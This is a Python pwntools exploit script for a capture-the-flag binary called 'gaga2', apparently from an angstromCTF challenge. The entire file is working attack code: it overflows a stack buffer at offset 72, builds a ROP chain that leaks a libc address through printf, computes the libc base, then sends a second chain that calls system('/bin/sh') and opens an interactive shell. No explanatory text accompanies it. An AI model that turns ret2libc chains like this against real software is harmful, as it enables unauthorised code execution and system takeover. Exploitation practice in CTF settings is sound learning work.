#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *

elf = context.binary = ELF('gaga2', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'challs.actf.co'
	port = int(args.PORT or 31302)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
tbreak main
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

rop = ROP(elf)
POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = POP_RDI_RET + 1

OFFSET = 72
# sla(b'input: ', cyclic(100, n=8))
sla(b'input: ', flat(
	OFFSET * b'A',
	RET,
	POP_RDI_RET,
	elf.got['setresgid'],
	elf.symbols['printf'],
	RET,
	elf.symbols['main'],
))

leak = r(6).ljust(8, b'\x00')
leak = u64(leak)

ls(f'libc leak: {leak:#x}')


libc = ELF('./libc-2.31.so')
libc.address = leak - libc.symbols['setresgid']

bin_sh = next(libc.search(b'/bin/sh\x00'))

ls(f'bin_sh: {bin_sh:#x}')

sl(flat(
	OFFSET * b'A',
	RET,
	POP_RDI_RET,
	bin_sh,
	libc.symbols['system'],
))

ia()
